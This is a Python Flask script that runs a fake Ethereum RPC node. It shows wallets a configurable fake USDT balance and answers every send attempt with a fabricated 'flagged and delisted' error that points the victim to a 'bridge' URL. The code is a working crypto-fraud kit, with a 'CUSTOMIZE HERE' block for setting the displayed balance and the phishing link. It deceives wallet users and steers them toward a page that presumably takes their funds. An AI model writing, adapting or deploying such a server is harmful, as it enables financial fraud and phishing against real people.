from flask import Flask, request, jsonify

app = Flask(__name__)

# ========== CUSTOMIZE HERE ==========
USDT_BAL = 1000000             # Displayed USDT balance
ETH_BAL = 0.005             # ETH balance shown
ERROR_URL = "www.xxxxxxxx."  # Bridge/error page shown in message
# ====================================

def eth_to_hex(eth_amount):
    return hex(int(eth_amount * (10 ** 18)))

def usdt_to_hex(usdt_amount):
    return hex(int(usdt_amount * (10 ** 6)))

@app.route("/", methods=["POST"])
def handle_rpc():
    req = request.get_json()
    method = req.get("method")
    req_id = req.get("id", 1)

    if method == "eth_chainId":
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0x1"})

    if method == "eth_getBalance":
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": eth_to_hex(ETH_BAL)})

    if method == "eth_call":
        params = req.get("params", [])
        if len(params) > 0:
            call_data = params[0].get("data", "")
            if call_data.startswith("0x70a08231"):  # balanceOf(address)
                return jsonify({"jsonrpc": "2.0", "id": req_id, "result": usdt_to_hex(USDT_BAL)})
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0x"})

    if method == "eth_sendRawTransaction":
        return jsonify({
            "jsonrpc": "2.0",
            "id": req_id,
            "error": {
                "code": -32000,
                "message": f"USDT Flagged and Delisted in the EU and Parts of the USA, Diagnose and bridge here ({ERROR_URL})"
            }
        })

    return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0x0"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
